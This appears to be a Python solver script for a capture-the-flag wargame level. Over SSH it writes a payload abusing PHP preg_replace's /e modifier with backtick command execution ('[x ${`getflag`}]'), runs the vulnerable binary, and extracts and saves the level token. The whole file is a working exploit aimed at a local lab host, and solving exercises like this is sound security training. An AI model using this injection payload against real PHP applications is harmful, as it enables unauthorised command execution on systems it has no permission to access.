"""Level06 - PHP /e Modifier Code Injection"""

import sys, re
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag

def exploit(host, port, ssh_port, pwd):
	print(f"[*] Connecting to level06@{host}:{ssh_port}")
	code, out, err = ssh_cmd(host, ssh_port, "level06", pwd, "id")
	if code != 0:
		print("[!] SSH failed")
		return False, ""
	print(f"[+] SSH OK: {out.strip()}\n")
	payload = "[x ${`getflag`}]"
	create_cmd = f"printf '{payload}\\n' > /tmp/level06_exploit.txt"
	ssh_cmd(host, ssh_port, "level06", pwd, create_cmd)
	print("[*] Executing...")
	cmd = "cd /home/user/level06 && ./level06 /tmp/level06_exploit.txt 2>&1"
	code, out, err = ssh_cmd(host, ssh_port, "level06", pwd, cmd)
	full_output = out + err
	if code == 0 or "token" in full_output.lower():
		print("[+] Executed!")
		clean_out = full_output.replace(" x ", ".")
		match = re.search(r"token\s*:\s*([a-zA-Z0-9_-]+)", clean_out)
		if match:
			print(f"[+] Token: {match.group(1)}")
			return True, match.group(1)
		return True, full_output.strip()
	print(f"[!] Failed. Code: {code}")
	return False, ""

def main():
	print("Level06 PHP /e Modifier Injection\n")
	pwd = read_flag(5)
	success, token = exploit("localhost", 4747, 4242, pwd)
	if success:
		save_flag(6, token)
		print(f"\n[SUMMARY]\n  Vulnerability: PHP preg_replace /e injection\n  Attack: Backtick execution in /e\n  Result: Shell command execution\n[ANSWER]\n  Level06 Token: {token}")
	else:
		print("[!] Exploit failed")
		sys.exit(1)

if __name__ == "__main__":
	main()
